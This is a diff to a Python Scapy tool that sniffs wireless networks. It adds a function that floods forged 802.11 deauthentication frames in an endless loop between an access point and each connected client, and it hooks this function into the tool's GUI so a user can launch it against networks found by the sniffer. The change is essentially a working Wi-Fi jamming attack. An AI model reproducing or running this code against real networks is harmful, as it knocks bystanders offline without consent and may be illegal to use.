@@ -1,6 +1,8 @@
 from scapy.all import *
 from scapy.layers.dot11 import *
 import threading
+
+import scapy.packet
 from change_channel import change_channel
 import gui
 
@@ -99,6 +101,20 @@ def start_sniffing():
     sniff(iface=INTERFACE_NAME, prn=handle_packet, store=False, stop_filter=lambda x: stop_sniffing.is_set())
 
 
+def deauth(ap):
+    while True:
+        for client in ap.clients:
+            ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=ap.bssid, addr2=client, addr3=ap.bssid)/Dot11Deauth()
+            client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=ap.bssid, addr3=ap.bssid)/Dot11Deauth()
+            sendp(ap_to_client, iface=INTERFACE_NAME, verbose=False)
+            sendp(client_to_ap, iface=INTERFACE_NAME, verbose=False)
+
+
+def deauth_thread(ap):
+    threading.Thread(target=deauth, args=(ap,)).start()
+
+
+
 access_points = []
 # Access point MAC addresses
 ap_bssids = set()
@@ -110,7 +126,7 @@ ssid_map = {}
 stop_sniffing = threading.Event()
 
 print('Starting GUI thread')
-gui_thread = threading.Thread(target=gui.start_gui, args=(get_aps, stop_sniffing,))
+gui_thread = threading.Thread(target=gui.start_gui, args=(get_aps, deauth_thread, stop_sniffing,))
 gui_thread.start()
 
 print('Starting sniffing thread')
